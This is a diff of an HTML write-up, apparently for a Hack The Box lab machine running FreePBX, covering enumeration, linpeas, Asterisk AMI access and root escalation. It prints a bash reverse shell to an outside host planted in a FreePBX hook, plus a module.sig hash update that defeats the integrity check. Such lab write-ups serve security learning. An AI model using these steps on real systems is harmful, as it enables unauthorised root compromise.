@@ -85,35 +85,35 @@
   </p>
 
   <pre><code>echo "10.129.15.209 connected.htb" | sudo tee -a /etc/hosts
-```
+
 
 curl -I http://connected.htb</code></pre>
 
-```
+
   <p>
     The HTTP headers showed Apache on CentOS with PHP 7.4.16. The application redirected to the FreePBX
     administration path.
   </p>
 
   <pre><code>HTTP/1.1 302 Found
-```
+
 
 Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
 X-Powered-By: PHP/7.4.16
 Location: /admin</code></pre>
 
-```
+
   <h2>Directory Enumeration</h2>
   <p>
     I used Gobuster to identify useful paths on the web server.
   </p>
 
   <pre><code>gobuster dir -u http://connected.htb \
-```
+
 
 -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
 
-```
+
   <p>Important results included:</p>
 
   <ul>
@@ -156,20 +156,20 @@ Location: /admin</code></pre>
   </p>
 
   <pre><code>whoami
-```
+
 
 id
 hostname</code></pre>
 
-```
+
   <p>Example user context:</p>
 
   <pre><code>uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
-```
+
 
 hostname: connected</code></pre>
 
-```
+
   <p>
     The user flag was readable because it was owned by <code>root:asterisk</code> and had group read permission.
   </p>
@@ -183,13 +183,13 @@ hostname: connected</code></pre>
   </p>
 
   <pre><code>python3 -m http.server 8080
-```
+
 
 wget http://10.10.14.209:8080/linpeas.sh
 chmod +x linpeas.sh
 bash linpeas.sh | tee linpeas.out</code></pre>
 
-```
+
   <p>
     Important findings included:
   </p>
@@ -210,18 +210,18 @@ bash linpeas.sh | tee linpeas.out</code></pre>
   </p>
 
   <pre><code>cat /etc/asterisk/manager.conf
-```
+
 
 nc 127.0.0.1 5038</code></pre>
 
-```
+
   <p>
     I authenticated to AMI successfully, but AMI commands are Asterisk CLI commands, not normal Linux shell
     commands. This confirmed useful access but did not directly provide root.
   </p>
 
   <pre><code>Action: Login
-```
+
 
 Username: <AMI_USERNAME>
 Secret: <AMI_SECRET>
@@ -230,7 +230,7 @@ Events: off
 Action: Command
 Command: core show version</code></pre>
 
-```
+
   <h2>Privilege Escalation</h2>
   <p>
     The main privilege escalation path came from abusing FreePBX's sysadmin hook mechanism. LinPEAS showed that
@@ -250,11 +250,11 @@ Command: core show version</code></pre>
   </p>
 
   <pre><code>file /usr/bin/sysadmin_manager
-```
+
 
 grep -nEi "argv|system|exec|shell_exec|passthru|incron|spool|asterisk" /usr/bin/sysadmin_manager</code></pre>
 
-```
+
   <p>
     The key execution sink was:
   </p>
@@ -267,11 +267,11 @@ grep -nEi "argv|system|exec|shell_exec|passthru|incron|spool|asterisk" /usr/bin/
   </p>
 
   <pre><code>ls -la /var/www/html/admin/modules/ucp/hooks/
-```
+
 
 ls -la /var/www/html/admin/modules/ucp/module.sig</code></pre>
 
-```
+
   <h3>Root Exploitation Steps</h3>
 
   <p>First, I backed up the original hook.</p>
@@ -281,7 +281,7 @@ ls -la /var/www/html/admin/modules/ucp/module.sig</code></pre>
   <p>Then I replaced the hook with a reverse shell payload.</p>
 
   <pre><code>cat &gt; /var/www/html/admin/modules/ucp/hooks/logrotate &lt;&lt; 'EOF'
-```
+
 
 #!/bin/bash
 bash -c "bash -i >& /dev/tcp/10.10.14.209/4445 0>&1"
@@ -289,14 +289,14 @@ EOF
 
 chmod +x /var/www/html/admin/modules/ucp/hooks/logrotate</code></pre>
 
-```
+
   <p>
     Because <code>sysadmin_manager</code> checked the hook hash, I calculated the new SHA256 hash and updated
     <code>module.sig</code>.
   </p>
 
   <pre><code>NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
-```
+
 
 echo $NEW_HASH
 
@@ -304,7 +304,7 @@ sed -i "s#hooks/logrotate = .*#hooks/logrotate = $NEW_HASH#" /var/www/html/admin
 
 grep "hooks/logrotate" /var/www/html/admin/modules/ucp/module.sig</code></pre>
 
-```
+
   <p>
     On my attacker machine, I started a second listener.
   </p>
@@ -323,12 +323,12 @@ grep "hooks/logrotate" /var/www/html/admin/modules/ucp/module.sig</code></pre>
   </p>
 
   <pre><code>id
-```
+
 
 whoami
 cat /root/root.txt</code></pre>
 
-```
+
   <h2>Tools Used</h2>
   <ul>
     <li>Nmap</li>
@@ -344,7 +344,7 @@ cat /root/root.txt</code></pre>
 
   <h2>Important Commands</h2>
   <pre><code>nmap 10.129.15.209
-```
+
 
 nmap -p 22 -sC -sV 10.129.15.209
 nmap -p 80 -sC -sV 10.129.15.209
@@ -390,7 +390,7 @@ sed -i "s#hooks/logrotate = .*#hooks/logrotate = $NEW_HASH#" /var/www/html/admin
 nc -lvnp 4445
 touch /var/spool/asterisk/incron/ucp.logrotate</code></pre>
 
-```
+
   <h2>Vulnerabilities / Misconfiguration</h2>
   <p>
     The initial foothold was possible because the target was running FreePBX 16.0.40.7, which was vulnerable
